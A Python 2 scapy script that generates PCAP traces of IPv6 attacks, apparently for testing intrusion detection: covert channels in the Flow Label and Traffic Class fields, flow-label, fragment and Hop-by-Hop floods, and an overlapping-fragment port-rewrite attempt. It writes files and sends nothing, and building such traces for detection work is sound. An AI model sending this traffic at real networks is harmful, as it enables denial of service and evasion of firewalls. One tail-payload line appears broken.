#!/usr/bin/env python2

from scapy.all import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--cc-flowlabel", help="Create covert channel in Flow Label", action="store_true")
parser.add_argument("--no-payload", help="Create trace without L4/L5", action="store_true")
parser.add_argument("--cc-traffic-class", help="Create covert channel in Traffic Class fields", action="store_true")
parser.add_argument("--fl-flood", help="Create flow label DoS attack", action="store_true")
parser.add_argument("--frag-flood", help="Create fragment flood attack", action="store_true")
parser.add_argument("--hopopt-flood", help="Create Hop-by-Hop header flood attack", action="store_true")
parser.add_argument("--frag-overlap", help="Create overlapping fragment with port rewrite attempt in second packet", action="store_true")
parser.add_argument("-d", "--destination", required=True, help="Destination IPv6 address")
parser.add_argument("-s", "--source", required=False, help="Source IPv6 address")
parser.add_argument("-g", "--generate", action="store_true")
parser.add_argument("-o", "--outfile", required=True, help="PCAP output file ID")

args = parser.parse_args()


eth = Ether()

FLOOD_NUM_PACKETS   =   500
CC_NUM_PACKETS      =   200

if args.cc_flowlabel:
    print "CC Flow Label attack"
    outputfile = "cc_fl_%s.pcap" % args.outfile
    l3 = IPv6(dst=args.destination, fl=RandNum(1,1048575))
    l4 = UDP()
    payload = Raw(load=RandString(100))
    packets = eth/l3/l4/payload * CC_NUM_PACKETS
    if args.no_payload:
        packets = eth/l3 * CC_NUM_PACKETS
    wrpcap(outputfile, packets);
    print "written resulting packets to %s" % outputfile

if args.cc_traffic_class:
    print "CC Traffic Class  attack"
    outputfile = "cc_tc_%s.pcap" % args.outfile
    #l3 = IPv6(tc=RandNum(1,2**8))
    l3 = IPv6(dst=args.destination, tc=RandNum(1,2**8))
    l4 = UDP()
    payload = Raw(load=RandString(100))
    packets = eth/l3/l4/payload * CC_NUM_PACKETS
    wrpcap(outputfile, packets);
    print "written resulting packets to %s" % outputfile

if args.fl_flood:
    print "Flow Label DoS attack"
    outputfile = "fl_dos_%s.pcap" % args.outfile
    l3 = None
    if args.source:
        l3 = IPv6(src=RandIP6(args.source), dst=RandIP6(args.destination), fl=RandNum(1,1048575))
    else:
        l3 = IPv6(dst=RandIP6(args.destination), fl=RandNum(1,1048575))
    l4 = UDP()
    payload = Raw(load=RandString(100))
    packets = eth/l3/l4/payload * CC_NUM_PACKETS
    if args.no_payload:
        packets = eth/l3 * CC_NUM_PACKETS
    wrpcap(outputfile, packets);
    print "written resulting packets to %s" % outputfile

if args.frag_flood:
    print "Fragment flood attack"
    outputfile = "frag_flood_%s.pcap" % args.outfile
    l3 = IPv6(dst=RandIP6(args.destination))/IPv6ExtHdrFragment(id=[RandNum(1,2**32)] * FLOOD_NUM_PACKETS)
    packets = eth/l3
    wrpcap(outputfile, packets);
    print "written resulting packets to %s" % outputfile


if args.hopopt_flood:
    print "Hop by Hop header flood"
    outputfile = "hopopt_flood_%s.pcap" % args.outfile
    # using a RandString() of length 36 because else another HBH header is appended for padding reasons
    l3 = IPv6(dst=RandIP6(args.destination))/IPv6ExtHdrHopByHop(options=HBHOptUnknown(optdata=RandString(36)))/UDP(sport=RandShort(), dport=80)/Raw(load=RandString(100))
    packets = eth/l3 * FLOOD_NUM_PACKETS
    wrpcap(outputfile, packets);
    print "written resulting packets to %s" % outputfile

if args.frag_overlap:
    print "Fragment overlap attack"
    outputfile = "frag_overlap_%s.pcap" % args.outfile
    NUM_TAIL_PACKETS = 20

    frag_id = RandNum(1,2**32)._fix() 
    first_port  = 80
    second_port = 22
    offset      =  2
    l3 = IPv6(dst=args.destination)
    first = [eth/l3/IPv6ExtHdrFragment(id=frag_id)/TCP(dport=first_port)/Raw("GET /some/valid/file.php")]
    second = [eth/l3/IPv6ExtHdrFragment(id=frag_id, offset=offset)/TCP(dport=second_port, flags="S")/Raw("SSH KEX STUFF")]
    tail = [eth/l3/IPv6ExtHdrFragment(id=frag_id)/TCP(dport=second_port, flags="A")/Raw(load=([RandString]*10))]


    packets = first + second + tail*NUM_TAIL_PACKETS

    wrpcap(outputfile, packets) 
    print "written resulting packets to %s" % outputfile
